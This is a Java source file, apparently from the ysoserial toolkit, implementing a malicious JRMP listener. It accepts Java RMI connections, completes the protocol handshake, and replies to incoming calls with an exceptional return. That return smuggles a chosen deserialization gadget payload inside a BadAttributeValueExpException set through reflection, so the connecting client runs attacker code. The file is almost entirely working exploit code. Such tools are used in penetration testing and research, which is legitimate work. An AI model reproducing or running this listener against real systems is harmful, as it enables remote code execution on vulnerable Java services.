/**
 * © 2016 AgNO3 Gmbh & Co. KG
 * All right reserved.
 * 
 * Created: 22.01.2016 by mbechler
 */
package ysoserial;


import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.rmi.MarshalException;
import java.rmi.server.ObjID;
import java.rmi.server.UID;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;

import sun.rmi.transport.TransportConstants;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.Reflections;


/**
 * @author mbechler
 *
 */
@SuppressWarnings ( {
    "javadoc", "nls", "restriction", "rawtypes"
} )
public class JRMPListener implements Runnable {

    private int port;
    private Object payloadObject;
    private ServerSocket ss;


    /**
     * @param port
     * @param payloadObject
     * @throws IOException
     * @throws NumberFormatException
     */
    public JRMPListener ( int port, Object payloadObject ) throws NumberFormatException, IOException {
        this.port = port;
        this.payloadObject = payloadObject;
        System.err.println("* Opening JRMP listener on " + this.port);
        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
    }


    public static final void main ( final String[] args ) {

        if ( args.length < 3 ) {
            System.err.println(JRMPListener.class.getName() + " <port> <payload_type> <payload_arg>");
            System.exit(-1);
            return;
        }

        final Class<? extends ObjectPayload> payloadClass = getPayloadClass(args[ 1 ]);
        if ( payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass) ) {
            System.err.println("Invalid payload type '" + args[ 1 ] + "'");
            System.exit(-1);
            return;
        }

        final Object payloadObject;
        try {
            final ObjectPayload payload = payloadClass.newInstance();
            payloadObject = payload.getObject(args[ 2 ]);
        }
        catch ( Exception e ) {
            System.err.println("Failed to construct payload");
            e.printStackTrace(System.err);
            System.exit(-1);
            return;
        }

        try {
            int port = Integer.parseInt(args[ 0 ]);
            JRMPListener c = new JRMPListener(port, payloadObject);
            c.run();
        }
        catch ( Exception e ) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }


    /**
     * {@inheritDoc}
     *
     * @see java.lang.Runnable#run()
     */
    public void run () {
        try {
            Socket s = null;
            try {
                while ( ( s = this.ss.accept() ) != null ) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
                        System.err.println("Have connection from " + remote);

                        InputStream is = s.getInputStream();
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);

                        // Read magic (or HTTP wrapper)
                        bufIn.mark(4);
                        @SuppressWarnings ( "resource" )
                        DataInputStream in = new DataInputStream(bufIn);
                        int magic = in.readInt();

                        short version = in.readShort();
                        if ( magic != TransportConstants.Magic || version != TransportConstants.Version ) {
                            s.close();
                            continue;
                        }

                        OutputStream sockOut = s.getOutputStream();
                        BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
                        @SuppressWarnings ( "resource" )
                        DataOutputStream out = new DataOutputStream(bufOut);

                        byte protocol = in.readByte();
                        System.err.println("Protocol " + protocol);

                        switch ( protocol ) {
                        case TransportConstants.StreamProtocol:
                            out.writeByte(TransportConstants.ProtocolAck);
                            out.writeUTF(remote.getHostString());
                            out.writeInt(remote.getPort());
                            out.flush();
                            in.readUTF();
                            in.readInt();
                        case TransportConstants.SingleOpProtocol:
                            doMessage(s, in, out, this.payloadObject);
                            break;
                        default:
                        case TransportConstants.MultiplexProtocol:
                            System.err.println("Unsupported protocol");
                            s.close();
                            continue;
                        }

                        bufOut.flush();
                        out.flush();
                    }
                    catch ( InterruptedException e ) {
                        return;
                    }
                    catch ( Exception e ) {
                        System.err.println("Error");
                        e.printStackTrace(System.err);
                    }
                    finally {
                        System.err.println("Closing connection");
                        s.close();
                    }

                }

            }
            finally {
                if ( s != null ) {
                    s.close();
                }
                if ( this.ss != null ) {
                    this.ss.close();
                }
            }

        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
    }


    /**
     * @param s
     * @param in
     * @param out
     * @throws Exception
     */
    private static void doMessage ( Socket s, DataInputStream in, DataOutputStream out, Object payload ) throws Exception {
        System.err.println("Reading message...");

        int op = in.read();

        switch ( op ) {
        case TransportConstants.Call:
            // service incoming RMI call
            System.err.println("Call");
            doCall(in, out, payload);
            break;

        case TransportConstants.Ping:
            System.err.println("Ping");
            // send ack for ping
            out.writeByte(TransportConstants.PingAck);
            break;

        case TransportConstants.DGCAck:
            UID u = UID.read(in);
            System.err.println("AGCAck " + u);
            break;

        default:
            throw new IOException("unknown transport op " + op);
        }

        s.close();
    }


    /**
     * @param in
     * @param out
     * @throws Exception
     */
    private static void doCall ( DataInputStream in, DataOutputStream out, Object payload ) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {

            /**
             * {@inheritDoc}
             *
             * @see java.io.ObjectInputStream#resolveClass(java.io.ObjectStreamClass)
             */
            @Override
            protected Class<?> resolveClass ( ObjectStreamClass desc ) throws IOException, ClassNotFoundException {
                throw new IOException("Not allowed to read object");
            }
        };

        try {
            ObjID.read(ois);
        }
        catch ( java.io.IOException e ) {
            throw new MarshalException("unable to read objID", e);
        }

        System.err.println("Sending return with payload");

        out.writeByte(TransportConstants.Return);// transport op
        ObjectOutputStream oos = new ObjectOutputStream(out) {

            /**
             * Serializes a location from which to load the the specified class.
             */
            @Override
            protected void annotateClass ( Class<?> cl ) throws IOException {
                writeObject(null);
            }


            /**
             * Serializes a location from which to load the specified class.
             */
            @Override
            protected void annotateProxyClass ( Class<?> cl ) throws IOException {
                annotateClass(cl);
            }
        };

        oos.writeByte(TransportConstants.ExceptionalReturn);
        new UID().write(oos);

        BadAttributeValueExpException ex = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(ex, "val", payload);
        oos.writeObject(ex);

        oos.flush();
        out.flush();
    }


    @SuppressWarnings ( "unchecked" )
    private static Class<? extends ObjectPayload> getPayloadClass ( final String className ) {
        try {
            return (Class<? extends ObjectPayload>) Class.forName(className);
        }
        catch ( Exception e1 ) {}
        try {
            return (Class<? extends ObjectPayload>) Class.forName(GeneratePayload.class.getPackage().getName() + ".payloads." + className);
        }
        catch ( Exception e2 ) {}
        return null;
    }

}
